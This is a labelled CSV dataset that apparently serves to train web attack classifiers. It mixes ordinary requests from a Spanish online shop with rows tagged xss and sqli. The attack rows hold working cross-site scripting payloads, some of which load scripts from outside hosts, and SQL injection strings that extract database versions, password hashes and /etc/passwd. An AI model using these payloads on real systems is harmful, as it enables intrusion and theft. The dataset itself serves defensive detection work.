payload,type
"&lt;OBJECT TYPE=\""text/x-scriptlet\"" DATA=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/OBJECT&gt;",xss
imagenes/1.gif,normal
imagenes/1.gif,normal
"soo1U: select * from users where id='1' <@&1 union select 1,version() -- 1'",sqli
"ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(1)"">DEF",xss
"ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF",xss
"calle daniel florido rodriguez, 105, 2?f",normal
"<BR SIZE=""&{javascript:alert(1)}"">",xss
"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:javascript:alert(1)"">XXX</a>",xss
"<img src\x12=x onerror=""javascript:alert(1)"">",xss
69346006v,normal
"&.oo1: select * from users where id=1 or \.< =1 union select 1,@@VERSION -- 1",sqli
a' waitfor delay '0:0:10'--,sqli
'>><marquee><h1>XSS</h1></marquee>,xss
wong@hiperespaa.ly,normal
miembros/imagenes/castro.jpg,normal
global/menum.jsp,normal
1o92r,normal
index.jsp,normal
portal,normal
<BODY ONLOAD=alert(’XSS’)>,xss
huertas acosa,normal
miembros/index.jsp,normal
desparpajo,normal
imagenes/logo.gif,normal
7.20E+15,normal
&lt;HTML&gt;&lt;BODY&gt;,xss
' or username is not NULL or username = ',sqli
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
95642019s,normal
miembros/imagenes/castro.jpg,normal
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",xss
publico/registro.jsp?modo=registro&login=guerette&password=2ilat9r7a&nombre=Rosa&apellidos=Sorts+Bransuel&email=sayle%40miemail.com.ic&dni=27404814S&direccion=Calle+Lirios%2C+51%2C+3%3FA&ciudad=Chelva&cp=39426&provincia=Lugo&ntc=9131603493426395&B1=Registrar,normal
"o1nUE: select * from users where id=1 <@1$ union select 1,version() -- 1",sqli
cooperma,normal
"<iframe src=""javascript:document.vulnerable=true; <",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
hani,normal
imperial 143,normal
miembros/imagenes/zarauz.jpg,normal
5215,normal
"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",xss
imagenes/3.gif,normal
index.jsp,normal
publico/carrito.jsp,normal
imagenes/cmenbul.gif,normal
imagenes/logo.gif,normal
publico/miembros.jsp,normal
publico/carrito.jsp,normal
47608,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"s?:s: select * from users where id=1 or ""]:"" or 1=1 -- 1",sqli
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
92621448b,normal
publico/autenticar.jsp?modo=entrar&login=westgart&pwd=embo4ina80&remember=on&B1=Entrar,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",sqli
misio+nal,normal
ostapchuk casal,normal
imagenes/cmenbul.gif,normal
.bronceada,normal
a8ique0r4r,normal
publico/pagar.jsp?modo=insertar&precio=211&B1=Confirmar,normal
3.82E+15,normal
<div style=content:url(%(svg)s)></div>,xss
5.98E+15,normal
"<object src=1 href=1 onerror=""javascript:alert(1)""></object>",xss
"<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",xss
incrdu69,normal
miembros/index.jsp,normal
&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;,xss
mercado 188,normal
global/menum.jsp,normal
petrie3@menorca.com.kp,normal
miembros/imagenes/ogono.jpg,normal
maiga,normal
leonila,normal
9.47E+15,normal
global/menum.jsp,normal
miembros/fotos.jsp,normal
<iframe src=http://xss.rocks/scriptlet.html <,xss
miembros/index.jsp,normal
37748,normal
miembros/editar.jsp?modo=registro&login=althea4&password=seGLAr&nombre=Floriano&apellidos=Escat+Monistca&email=beaudine%40barnizultravioleta.sz&dni=24120558K&direccion=Calle+Duque+De+Ahumada%2C+67%2C+&ciudad=Cantalejo&cp=48600&provincia=Segovia&ntc=3781089949607589&B1=Registrar,normal
almacelles,normal
imagenes/1.gif,normal
publico/carrito.jsp,normal
rec,normal
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;,xss
"s.n: select * from users where id=1 or "".["" or 1=1 -- 1",sqli
7u4o84z1m07459,normal
victorico,normal
publico/caracteristicas.jsp?id=1,normal
publico/miembros.jsp,normal
publico/pagar.jsp?modo=insertar&precio=8285&B1=Pasar+por+caja,normal
miembros/editar.jsp?modo=registro&login=naresh&password=72nt89CT7V1&nombre=Eulalio&apellidos=Escudero+Ostria&email=gorse%4016horas.yu&dni=86274990N&direccion=Calle+Fermin+Salvochea+155+&ciudad=Alcolea+del+Pinar&cp=14230&provincia=Teruel&ntc=0981560265462116&B1=Registrar,normal
palau-saverdera,normal
imagenes/2.gif,normal
jorge paquirachi,normal
"sonnU: select * from users where id='1' <@$_ union select 1,version() -- 1'",sqli
"<a href=""\x0Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/caracteristicas.jsp?id=2,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
alcalde gregorio espino 165,normal
ajuagas,normal
"""`'><script>\x3Bjavascript:alert(1)</script>",xss
&#X000003c,xss
"<? foo=""><x foo='?><script>javascript:alert(1)</script>'>"">",xss
index.jsp,normal
7stambrar,normal
"pera, la",normal
"<STYLE type=""text/css"">BODY{background:url(""javascript:javascript:alert(1)"")}</STYLE>",xss
&#39;&#88;&#83;&#83;&#39;&#41;>,xss
18898337l,normal
publico/pagar.jsp?modo=insertar&precio=2399&B1=Confirmar,normal
<;/br style=a:expression(alert())>;,xss
"1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",sqli
chirlern,normal
jeanhee,normal
imagenes/1.gif,normal
nadir,normal
<IMG SRC=javascript:alert(‘XSS’)>      ,xss
8703,normal
global/estilos.css,normal
membro,normal
""") or (""x"")=(""x",sqli
<img/src=`` onerror=this.onerror=confirm(1) ,xss
miembros/imagenes/ogono.jpg,normal
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
kimbroug,normal
denno,normal
palmer manzano,normal
"s,,s: select * from users where id=1 or "",,""=1 or 1=1 -- 1",sqli
"<script ""a='>'"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
index.jsp,normal
bertorelli,normal
miembros/imagenes/zarauz.jpg,normal
publico/productos.jsp,normal
imagenes/logo.gif,normal
"<body onunload=""javascript:alert('XSS');"">",xss
imagenes/nuestratierra.jpg,normal
"<object classid=""clsid:..."" codebase=""javascript:document.vulnerable=true;"">",xss
miembros/index.jsp,normal
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
publico/autenticar.jsp?modo=entrar&login=baudoin&pwd=destullecer&remember=on&B1=Entrar,normal
global/estilos.css,normal
sant andreu de la barca,normal
miembros/salir.jsp,normal
publico/caracteristicas.jsp?id=1,normal
global/titulo.jsp,normal
miembros/fotos.jsp,normal
aula,normal
"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",xss
"calle kresaltxu 94, 3?b",normal
condensativo,normal
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",xss
"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",xss
85,normal
"<img STYLE=""xss:expr/*XSS*/ession(document.vulnerable=true)"">",xss
miembros/imagenes/zarauz.jpg,normal
torre de arcas,normal
"c/ curadero, 101, 12?e",normal
"<;A HREF="";http://google:ha.ckers.org"";>;XSS<;/A>;",xss
imagenes/nuestratierra.jpg,normal
publico/carrito.jsp,normal
global/creditos.jsp,normal
publico/registro.jsp?modo=registro&login=whipple&password=columbino&nombre=Enri&apellidos=Sol+Sieso&email=volkman%40acchportugal.py&dni=62955100Y&direccion=Macario%2C+87%2C+&ciudad=Villanueva+del+Fresno&cp=33216&provincia=Valencia&ntc=8400067402160298&B1=Registrar,normal
46841,normal
"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",xss
segundo,normal
miembros/index.jsp,normal
publico/productos.jsp,normal
riego,normal
3015,normal
index.jsp,normal
global/menum.jsp,normal
"&lt;LINK REL=\""stylesheet\"" HREF=\""javascript&#058;alert('XSS');\""&gt;",xss
miembros/imagenes/ogono.jpg,normal
publico/productos.jsp,normal
"c/ poeta bernardo de la torre 10,",normal
"c/ pontevedra 25, 6a",normal
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
foo<script>alert(document.cookie)</script>,xss
blanquer,normal
45699398p,normal
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss
"calle santa pola, 7",normal
2.19E+15,normal
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,xss
jurez,normal
miembros/editar.jsp?modo=registro&login=nickonov&password=p%24ipo&nombre=Agat%F3n&apellidos=Ceccarelli+Urp%ED&email=werkmeister%4019horas.zr&dni=85744372G&direccion=Calle+Pravia+74%2C+&ciudad=Villaviciosa+de+Od%F3n&cp=31640&provincia=Salamanca&ntc=7022174850420090&B1=Registrar,normal
"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",xss
"s&noU: select * from users where id='1' or $<\ union select 1,@@VERSION -- 1'",sqli
miembros/index.jsp,normal
"<A HREF=""http://1113982867/"">XSS</A>",xss
publico/productos.jsp,normal
ceciley,normal
publico/miembros.jsp,normal
19119,normal
miembros/index.jsp,normal
<iframe/onreadystatechange=alert(1),xss
publico/carrito.jsp,normal
drohocka@baybay.mq,normal
6173,normal
global/titulo.jsp,normal
global/titulo.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=7&B1=A%F1adir+al+carrito,normal
"<img\x11src=x onerror=""javascript:alert(1)"">",xss
rodis-ryan@colorprint.info,normal
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",xss
miembros/fotos.jsp,normal
26586,normal
"ABC<div style=""x:\xE2\x80\x8Aexpression(javascript:alert(1)"">DEF",xss
22997473a,normal
"<form><isindex formaction=""javascript&colon;confirm(1)""",xss
logo.png HTTP/1.0,normal
siseo,normal
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=31&B1=A%F1adir+al+carrito,normal
global/creditos.jsp,normal
berber,normal
4916,normal
5.49E+15,normal
50200,normal
moyes,normal
publico/autenticar.jsp?modo=entrar&login=terangue&pwd=potrear&remember=on&B1=Entrar,normal
"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/salir.jsp,normal
replace,sqli
andreu agraso,normal
v9n939z6,normal
"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
dalenna,normal
index.jsp,normal
imagenes/nuestratierra.jpg,normal
buch als,normal
miembros/fotos.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"&o.UE: select * from users where id=1 or \<\. union select 1,@@VERSION -- 1",sqli
publico/autenticar.jsp?modo=entrar&login=metcalfe&pwd=FilAnTR%F3pIca&remember=on&B1=Entrar,normal
6.80E+15,normal
miembros/index.jsp,normal
global/menum.jsp,normal
7.91E+15,normal
"<meta charset= ""x-imap4-modified-utf7""&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>",xss
miembros/salir.jsp,normal
70132648j,normal
armintario,normal
publico/carrito.jsp,normal
horalek,normal
miembros/index.jsp,normal
"s(:s: select * from users where id=1 or ""(:"" or 1=1 -- 1",sqli
"<a href=""\xE1\xA0\x8Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"calle dean miranda 106, 6-f",normal
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss
"errekerte 113,",normal
global/titulo.jsp,normal
miembros/imagenes/zarauz.jpg,normal
7znallo,normal
7965,normal
<IMG SRC=`javascript:javascript:alert(1)`>,xss
24596413y,normal
cantoria,normal
veneranda,normal
rosalia,normal
"<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>",xss
publico/productos.jsp,normal
publico/registro.jsp?modo=registro&login=ferreira5&password=recomendaci%24%F3n&nombre=Salvatore&apellidos=Fortuny+Goyenaga&email=vree%40eddydaniele.tm&dni=01067171V&direccion=Calle+Betanzos%2C+S%2FN+&ciudad=Torre+de+Esteban+Hambr%E1n%2C+La&cp=24429&provincia=Castell%F3n&ntc=1290238048117290&B1=Registrar,normal
ulls,normal
"s(UEs: select * from users where id=1 or 1#""( union select 'a',version() -- 1",sqli
publico/registro.jsp?modo=registro&login=meara&password=anest1sica&nombre=Jugen&apellidos=Cabot+Camaran&email=baigent%40blueberryminiloaf.com.dj&dni=69409914P&direccion=Castelo+Branco%2C+63%2C+&ciudad=Villalba+de+la+Loma&cp=37329&provincia=Baleares+%28Illes%29&ntc=2796348455963884&B1=Registrar,normal
publico/caracteristicas.jsp?id=1,normal
imagenes/logo.gif,normal
"<IMG SRC=x onloadeddata=""alert(String.fromCharCode(88,83,83))"">",xss
publico/miembros.jsp,normal
publico/productos.jsp,normal
"s(o1U: select * from users where id=1 or @#""(=1 union select 1,version() -- 1",sqli
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss
98810075m,normal
imagenes/cmenbul.gif,normal
publico/productos.jsp,normal
miembros/salir.jsp,normal
miembros/index.jsp,normal
imagenes/logo.gif,normal
publico/autenticar.jsp?modo=entrar&login=salhany0&pwd=88l2f1r9&remember=on&B1=Entrar,normal
ganoza,normal
20115,normal
imagenes/nuestratierra.jpg,normal
publico/registro.jsp?modo=registro&login=subhashi&password=%2Bfaccioso&nombre=Ademaro&apellidos=Rubau&email=eiffel%40noviasteresapalacios.coop&dni=44578051A&direccion=Ballena%2C+91%2C+10%3FA&ciudad=Cervera+del+R%EDo+Alhama&cp=49130&provincia=Teruel&ntc=8888494677705913&B1=Registrar,normal
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>,xss
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
miembros/fotos.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
2,normal
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss
imagenes/nuestratierra.jpg,normal
2614,normal
alpedrete,normal
dawson@eco-pro.to,normal
global/menum.jsp,normal
"<img[a][b][c]src[d]=x[e]onerror=[f]""alert(1)"">",xss
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;,xss
publico/autenticar.jsp?modo=entrar&login=foubert&pwd=cla20te&remember=off&B1=Entrar,normal
publico/carrito.jsp,normal
6.24E+15,normal
' or 1 in (select @@version)--,sqli
publico/pagar.jsp?modo=insertar&precio=9120&B1=Confirmar,normal
"pl. curro cuchares, 72,",normal
gambs galatioto,normal
miembros/imagenes/castro.jpg,normal
"<image src=1 href=1 onerror=""javascript:alert(1)""></image>",xss
imagenes/nuestratierra.jpg,normal
"s;n: select * from users where id=1 or "";["" or 1=1 -- 1",sqli
miembros/index.jsp,normal
"perl -e 'print \""&lt;IMG SRC=java\0script&#058;alert(\\""XSS\\"")&gt;\"";' &gt; out",xss
imagenes/1.gif,normal
escultor damian forment 128 11?g,normal
imagenes/1.gif,normal
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;,xss
isasi urquiza,normal
global/menum.jsp,normal
global/creditos.jsp,normal
des9o89451rac28,normal
' or 0=0 --,sqli
klaudt,normal
"""`'><script>\xE2\x80\xAFjavascript:alert(1)</script>",xss
calle codigo correspondencia oficial correos-telegrafos s/n 9a,normal
soon&: select * from users where id='1' + $+%$ or 1=1 -- 1',sqli
haddon@hiperbarcelona.tl,normal
publico/autenticar.jsp?modo=entrar&login=licia&pwd=f983Ga2783&remember=on&B1=Entrar,normal
create user name identified by 'pass123',sqli
5672,normal
<<SCRIPT>%(payload)s//<</SCRIPT>,xss
"c/ boabdil, 91",normal
crcova valentini,normal
miembros/salir.jsp,normal
88253687l,normal
publico/pagar.jsp?modo=insertar&precio=5106&B1=Pasar+por+caja,normal
publico/productos.jsp,normal
ceferina,normal
miembros/fotos.jsp,normal
global/titulo.jsp,normal
"c/ clivia, 1, 1?d",normal
publico/carrito.jsp,normal
imagenes/cmenbul.gif,normal
publico/registro.jsp?modo=registro&login=attilio&password=tu6E3a5a&nombre=Obdulio&apellidos=Gadea+Prat&email=belmondo%40artesania.org.ci&dni=39152269J&direccion=Calle+Capitan+Salas+97%2C+&ciudad=Garciaz&cp=09227&provincia=C%E1ceres&ntc=5255016250924292&B1=Registrar,normal
penarroya ingla,normal
"<img SRC=""javascript:document.vulnerable=true;"">",xss
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss
"';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\"";alert(String&#46;fromCharCode(88,83,83))//\\"";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\""&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;",xss
"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",sqli
publico/carrito.jsp,normal
imagenes/logo.gif,normal
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
miembros/editar.jsp?modo=registro&login=kunkel&password=modorrillo&nombre=Casiodoro&apellidos=Marqu%E9s&email=wincott_remeck%40enformetera.com.sc&dni=51975226X&direccion=Pi+y+Margall+17%2C+7%3FF&ciudad=Barbalos&cp=18300&provincia=Teruel&ntc=8912004350396189&B1=Registrar,normal
publico/registro.jsp?modo=registro&login=torcac2&password=pir%F3scafo&nombre=Agostina&apellidos=Camino+De+Mendonca&email=komarov%40docerosas.dk&dni=92106863M&direccion=Calle+Radio%2C+89+10F&ciudad=Torreblascopedro&cp=31153&provincia=Asturias&ntc=6202334892240470&B1=Registrar,normal
"<img src=x\x13onerror=""javascript:alert(1)"">",xss
<IMG SRC=javascript:alert('XSS')>,xss
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
empuar,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
calle castropol 11,normal
mallat paiva,normal
"<IMG SRC=x onseeked=""alert(String.fromCharCode(88,83,83))"">",xss
miembros/salir.jsp,normal
perendengue,normal
publico/registro.jsp?modo=registro&login=cen&password=40a5E&nombre=Nurit&apellidos=Ferrandez+Caba%F1as&email=tarpey%40bwds.ne&dni=17621392B&direccion=Calle+Clavel+30+11%3FB&ciudad=Tronch%F3n&cp=17463&provincia=C%E1ceres&ntc=1527409541807001&B1=Registrar,normal
publico/miembros.jsp,normal
miembros/index.jsp,normal
publico/caracteristicas.jsp?id=1,normal
"<a href=""\xE2\x80\x83javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
